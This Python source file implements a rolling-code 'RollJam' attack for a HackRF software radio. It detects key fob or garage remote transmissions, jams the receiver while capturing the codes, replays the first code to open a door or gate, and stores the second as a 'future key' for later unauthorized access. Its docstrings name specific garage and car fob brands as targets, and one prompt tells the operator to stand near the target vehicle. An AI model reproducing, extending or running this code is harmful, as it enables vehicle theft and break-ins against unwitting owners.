
import numpy as np
import subprocess
from typing import Optional, List
import time
import os
from dataclasses import dataclass

@dataclass
class CapturedSignal:
    """Container for captured RF signal"""
    frequency: float
    sample_rate: float
    samples: np.ndarray
    timestamp: float
    protocol: str = "Unknown"
    
class RollingCodeAttack:
    """
    Rolling Code Jam-Replay Attack
    
    Defeats rolling code security by jamming original transmission
    and replaying captured code later.
    
    Attack Flow:
    1. Monitor target frequency (315/433/868/915 MHz)
    2. Detect RF burst (button press)
    3. Immediately jam on same frequency (CW noise)
    4. Capture signal during jam
    5. Replay captured signal to open door/start car
    
    Effective against:
    - Garage door openers (CAME, Nice, Chamberlain)
    - Car key fobs (most non-encrypted)
    - Wireless doorbells
    - Remote control systems
    
    Requires: HackRF One with TX capability
    """
    
    def __init__(self, sdr_controller=None, recorder=None):
        self.sdr = sdr_controller
        self.recorder = recorder
        self.save_dir = "captures/subghz" # Fallback aligned with Recorder
        if not recorder:
            os.makedirs(self.save_dir, exist_ok=True)
            
        self.captured_signals: List[CapturedSignal] = []
        self.monitoring = False

            
    def identify_signal(self, freq_hz: float, timeout: int = 10) -> Optional[dict]:
        """
        Step 1: Signal Identification and Synchronization
        Learns the key's language (Preamble, Sync, Polarity).
        
        Args:
            freq_hz: Frequency to listen on (e.g., 315e6)
            timeout: How long to listen in seconds
            
        Returns:
            Dict with metadata (polarity, protocol, hex) or None
        """
        print(f"[Rolling Code] Identifying signal on {freq_hz/1e6:.2f} MHz...")
        
        # Try both the lightweight Nice decoder and the Manchester-based
        # Flo‑R decoder for robust identification.
        from modules.decoders.nice_decoder import NiceDecoder
        from modules.decoders.nice_flor_decoder import NiceFlorDecoder
        nice_decoder = NiceDecoder()
        flor_decoder = NiceFlorDecoder()
        
        # We'll use capture_samples to get a chunk and process it offline for stability
        samples = self.sdr.capture_samples(num_samples=2000000, timeout=timeout) # 1 sec at 2Msps
        
        if samples is None:
            print("[Rolling Code] No signal detected during identification.")
            return None
            
        # Process samples into OOK pulses
        # 1. Magnitude
        mag = np.abs(samples)
        thresh = np.mean(mag) * 3
        binary = (mag > thresh).astype(int)
        
        # 2. Extract run-lengths (pulses) in microseconds
        # 2Msps -> 0.5 us per sample
        transitions = np.where(binary[:-1] != binary[1:])[0]
        if len(transitions) == 0:
            print("[Rolling Code] No pulses found.")
            return None
            
        current_idx = 0
        current_level = binary[0]
        
        for idx in transitions:
            duration_samples = idx - current_idx
            duration_us = duration_samples * 0.5
            
            # Feed both decoders with the same pulse stream
            nice_decoder.feed(current_level, int(duration_us))
            flor_decoder.feed(int(current_level), float(duration_us))
            
            current_idx = idx
            current_level = binary[idx+1]
        
        # First, try detailed Flo‑R Manchester decoder
        flor_meta = flor_decoder.deserialize()
        if flor_meta:
            print(
                "[Rolling Code] IDENTIFIED (Flo‑R Manchester): "
                f"Serial={flor_meta.get('serial')} Btn={flor_meta.get('button')} "
                f"Enc={flor_meta.get('encrypted')} Conf={flor_meta.get('confidence'):.2f}"
            )
            return flor_meta
        
        # Fallback to classic Nice decoder metadata
        meta = nice_decoder.get_metadata()
        if meta.get('state') == 'COMPLETE':
            print(
                "[Rolling Code] IDENTIFIED (Nice): "
                f"{meta.get('variant')} | Polarity: "
                f"{'Inverted' if meta.get('inverted') else 'Normal'} | "
                f"Hex: {meta.get('hex_payload')}"
            )
            return meta
        
        print(f"[Rolling Code] Identification failed: {meta.get('state')} - {meta.get('error')}")
        return None

    def perform_rolljam(self, freq_hz: float):
        """
        Step 2, 3, 4: Execute Full RollJam Attack with Time-Division Alternation
        
        TRUE ROLLJAM TECHNIQUE:
        - Rapidly alternate between TX (jamming) and RX (capturing) in microsecond slices
        - This simultaneously JAMS the car/garage receiver while CAPTURING the keyfob code
        - The car never receives the code, but we capture it for later replay
        
        Attack Sequence:
        1. Detect signal start → Begin time-division jam/capture (Code 1)
        2. Wait for user to press fob again (they think it failed)
        3. Detect signal start → Begin time-division jam/capture (Code 2)  
        4. Replay Code 1 to unlock door (user enters)
        5. Keep Code 2 for future unauthorized access
        """
        print(f"\n[Rolling Code] STARTING TIME-DIVISION ROLLJAM on {freq_hz/1e6:.2f} MHz")
        print("[Rolling Code] 🔴 CRITICAL: This is the REAL RollJam attack")
        print("[Rolling Code] 📡 Will alternate TX/RX at microsecond intervals")
        timestamp = int(time.time())
        
        # --- PHASE 1: Time-Division Jam+Capture Code 1 ---
        cap_file_1 = os.path.abspath(os.path.join(self.save_dir, f"rolljam_1_{timestamp}.cs16"))
        print("\n[RollJam] PHASE 1: Waiting for first keyfob press...")
        print("[RollJam] 🎯 Press target keyfob NOW")
        
        # Wait for signal detection
        signal_detected = self._wait_for_signal_start(freq_hz, timeout=30)
        if not signal_detected:
            print("[RollJam] ❌ Timeout - No signal detected")
            return
        
        print("[RollJam] 🚨 SIGNAL DETECTED - Starting time-division attack!")
        
        # Execute time-division jam+capture
        success1 = self._time_division_jam_capture(
            freq_hz, 
            cap_file_1, 
            duration=2.0,
            jam_duty_cycle=0.7  # 70% jamming, 30% capturing
        )
        
        if not success1:
            print("[RollJam] ❌ Code 1 capture failed")
            return
        
        print(f"[RollJam] ✅ CODE 1 CAPTURED: {cap_file_1}")
        print("[RollJam] 📝 Car/Garage did NOT receive this code (jammed)")
        
        # --- PHASE 2: Time-Division Jam+Capture Code 2 ---
        cap_file_2 = os.path.abspath(os.path.join(self.save_dir, f"rolljam_2_{timestamp}.cs16"))
        print("\n[RollJam] PHASE 2: Waiting for second keyfob press...")
        print("[RollJam] 💡 User thinks fob failed - will press again")
        print("[RollJam] 🎯 Waiting for second press...")
        
        # Wait for second signal
        signal_detected = self._wait_for_signal_start(freq_hz, timeout=30)
        if not signal_detected:
            print("[RollJam] ⚠️  Timeout on Code 2 - Proceeding with Code 1 only")
            cap_file_2 = None
        else:
            print("[RollJam] 🚨 SECOND SIGNAL DETECTED - Capturing...")
            
            # Execute time-division jam+capture for Code 2
            success2 = self._time_division_jam_capture(
                freq_hz,
                cap_file_2,
                duration=2.0,
                jam_duty_cycle=0.7
            )
            
            if success2:
                print(f"[RollJam] ✅ CODE 2 CAPTURED (FUTURE KEY): {cap_file_2}")
                print("[RollJam] 🔐 This code will work NEXT time - permanent access!")
                
                # Store future key in database
                if self.recorder:
                    self.recorder.db.append({
                        "id": timestamp + 1,
                        "freq_mhz": freq_hz/1e6,
                        "name": f"FUTURE_KEY_{int(time.time())}",
                        "file": cap_file_2,
                        "timestamp": time.time()
                    })
            else:
                print("[RollJam] ⚠️  Code 2 capture failed - only have Code 1")
                cap_file_2 = None

        # --- PHASE 3: Replay Code 1 to Unlock ---
        print("\n[RollJam] PHASE 3: Replaying Code 1...")
        print("[RollJam] 🔓 Unlocking door/gate with Code 1...")
        time.sleep(1.0)  # Brief delay for realism
        
        self.sdr.replay_signal(cap_file_1, freq_hz, 2e6)
        
        print("\n[RollJam] ✅ ATTACK COMPLETE!")
        print(f"[RollJam] 📊 Status:")
        print(f"[RollJam]    - Code 1: REPLAYED (door opened)")
        print(f"[RollJam]    - Code 2: {'STORED (future access)' if cap_file_2 else 'N/A'}")
        print(f"[RollJam]    - Detection Risk: LOW (appears as normal unlock)")

    def _wait_for_signal_start(self, freq_hz: float, timeout: float = 30) -> bool:
        """
        Wait for RF signal to start (detect keyfob button press)
        
        Uses energy detection to identify transmission start
        """
        print(f"[RollJam] Monitoring {freq_hz/1e6:.2f} MHz for signal...")
        
        start_time = time.time()
        baseline_power = None
        threshold_multiplier = 3.0  # Signal must be 3x baseline
        
        while time.time() - start_time < timeout:
            # Capture short sample to check for signal
            samples = self.sdr.capture_samples(num_samples=50000, timeout=0.1)  # 25ms at 2Msps
            
            if samples is None or len(samples) == 0:
                time.sleep(0.05)
                continue
            
            # Calculate signal power
            power = np.mean(np.abs(samples) ** 2)
            
            # Establish baseline on first iteration
            if baseline_power is None:
                baseline_power = power
                continue
            
            # Check if signal exceeds threshold
            if power > baseline_power * threshold_multiplier:
                print(f"[RollJam] 📡 Signal detected! Power: {power:.2e} (baseline: {baseline_power:.2e})")
                return True
            
            # Update baseline with moving average
            baseline_power = 0.9 * baseline_power + 0.1 * power
            time.sleep(0.05)  # 50ms poll interval
        
        return False

    def _time_division_jam_capture(self, freq_hz: float, output_file: str, 
                                   duration: float = 2.0, jam_duty_cycle: float = 0.7) -> bool:
        """
        Perform time-division alternating jam and capture
        
        TECHNIQUE:
        - Rapidly alternate between TX (jamming) and RX (capturing)
        - Jam slice: 70% of time - prevents car from receiving
        - Capture slice: 30% of time - captures the keyfob signal
        - Alternate at ~100Hz (10ms cycles)
        
        The car's receiver is jammed during most of the transmission,
        but we capture enough samples during RX windows to reconstruct the code.
        
        Args:
            freq_hz: Frequency to jam/capture
            output_file: Where to save captured signal
            duration: Total attack duration in seconds
            jam_duty_cycle: Fraction of time spent jamming (vs capturing)
        
        Returns:
            True if signal was captured successfully
        """
        print(f"[RollJam] Starting time-division attack:")
        print(f"[RollJam]   - Jam duty cycle: {jam_duty_cycle*100:.0f}%")
        print(f"[RollJam]   - Capture duty cycle: {(1-jam_duty_cycle)*100:.0f}%")
        print(f"[RollJam]   - Duration: {duration}s")
        
        # Time slicing parameters
        cycle_period = 0.01  # 10ms per cycle (100 Hz alternation)
        jam_time = cycle_period * jam_duty_cycle
        capture_time = cycle_period * (1 - jam_duty_cycle)
        
        start_time = time.time()
        all_samples = []
        
        try:
            while time.time() - start_time < duration:
                cycle_start = time.time()
                
                # --- JAM PHASE ---
                if not self.sdr.start_jamming(freq_hz):
                    print("[RollJam] ⚠️  Jamming failed to start")
                    break
                
                # Jam for calculated duration
                time.sleep(jam_time)
                self.sdr.stop_jamming()
                
                # --- CAPTURE PHASE ---
                # Calculate samples for this capture window
                sample_rate = 2e6
                samples_to_capture = int(capture_time * sample_rate)
                
                # Quickly switch to RX and capture
                samples = self.sdr.capture_samples(
                    num_samples=samples_to_capture, 
                    timeout=capture_time + 0.001  # Slight buffer
                )
                
                if samples is not None and len(samples) > 0:
                    all_samples.append(samples)
                
                # Maintain timing - wait for rest of cycle
                elapsed = time.time() - cycle_start
                if elapsed < cycle_period:
                    time.sleep(cycle_period - elapsed)
            
            # Stop any ongoing jamming
            self.sdr.stop_jamming()
            
            # Combine all captured samples
            if len(all_samples) == 0:
                print("[RollJam] ❌ No samples captured")
                return False
            
            combined_samples = np.concatenate(all_samples)
            
            # Validate signal strength
            signal_power = np.mean(np.abs(combined_samples) ** 2)
            noise_floor = np.percentile(np.abs(combined_samples) ** 2, 10)
            snr = 10 * np.log10(signal_power / (noise_floor + 1e-10))
            
            print(f"[RollJam] Captured {len(combined_samples)} samples")
            print(f"[RollJam] SNR: {snr:.1f} dB")
            
            if snr < 6:  # Minimum 6dB SNR
                print(f"[RollJam] ⚠️  Weak signal (SNR {snr:.1f} dB)")
                # Continue anyway - might still work
            
            # Save to file (complex16 format: interleaved I/Q)
            # Convert complex samples to int16
            i_samples = (combined_samples.real * 32767).astype(np.int16)
            q_samples = (combined_samples.imag * 32767).astype(np.int16)
            
            # Interleave I and Q
            iq_interleaved = np.empty(len(i_samples) * 2, dtype=np.int16)
            iq_interleaved[0::2] = i_samples
            iq_interleaved[1::2] = q_samples
            
            # Write to file
            with open(output_file, 'wb') as f:
                iq_interleaved.tofile(f)
            
            file_size = os.path.getsize(output_file)
            print(f"[RollJam] ✅ Saved {file_size} bytes to {output_file}")
            
            return True
            
        except Exception as e:
            print(f"[RollJam] ❌ Time-division attack failed: {e}")
            import traceback
            traceback.print_exc()
            
            # Ensure jamming is stopped
            try:
                self.sdr.stop_jamming()
            except:
                pass
            
            return False

    def start_monitor(self, freq_hz: float, sample_rate: float = 2e6):
        """Start monitoring loop"""
        # ... logic reused or wrapper for identify_signal loop ...
        while self.monitoring:
            self.identify_signal(freq_hz, timeout=1)
    
    def start_jam_and_replay(self, freq_hz: float):
        """GUI Trigger"""
        self.perform_rolljam(freq_hz)

    # Legacy/Helper methods below...
    def save_signal(self, index: int, filename: str):
        pass # ...
        """Save captured signal to file for later replay"""
        if index >= len(self.captured_signals):
            print("[Rolling Code] Invalid signal index")
            return
            
        signal = self.captured_signals[index]
        
        # Save as numpy array
        np.savez(
            filename,
            samples=signal.samples,
            frequency=signal.frequency,
            sample_rate=signal.sample_rate,
            timestamp=signal.timestamp
        )
        
        print(f"[Rolling Code] Signal saved to {filename}")
        
    def load_signal(self, filename: str):
        """Load previously saved signal"""
        try:
            data = np.load(filename)
            
            signal = CapturedSignal(
                samples=data['samples'],
                frequency=float(data['frequency']),
                sample_rate=float(data['sample_rate']),
                timestamp=float(data['timestamp'])
            )
            
            self.captured_signals.append(signal)
            print(f"[Rolling Code] Signal loaded from {filename}")
            
        except Exception as e:
            print(f"[Rolling Code] Load failed: {e}")
            
    def stop(self):
        """Stop monitoring"""
        self.monitoring = False
        print("[Rolling Code] Monitoring stopped")
        
    def list_signals(self):
        """List all captured signals"""
        if not self.captured_signals:
            print("[Rolling Code] No signals captured")
            return
            
        print(f"\n[Rolling Code] Captured Signals ({len(self.captured_signals)}):")
        for i, sig in enumerate(self.captured_signals):
            print(f"  [{i}] {time.ctime(sig.timestamp)} - {sig.frequency/1e6:.2f} MHz - {len(sig.samples)} samples")

    def perform_attack(self, freq_hz: float):
        """
        Main entry point for GUI - performs complete RollJam attack
        Returns list of captured code files
        """
        print(f"\n🎯 [RollJam] Starting attack on {freq_hz/1e6:.2f} MHz")
        print("[RollJam] ⚠️  Stand near target vehicle")
        print("[RollJam] ⚠️  Press key fob TWICE when prompted")
        
        try:
            # Execute the full RollJam sequence
            self.perform_rolljam(freq_hz)
            
            # Return captured files
            codes = []
            import glob
            recent_captures = sorted(glob.glob(os.path.join(self.save_dir, "rolljam_*.cs16")), 
                                    key=os.path.getmtime, reverse=True)
            
            if len(recent_captures) >= 2:
                codes = recent_captures[:2]
                print(f"[RollJam] ✅ Captured {len(codes)} codes")
            
            return codes
            
        except Exception as e:
            print(f"[RollJam] ❌ Attack failed: {e}")
            import traceback
            traceback.print_exc()
            return []
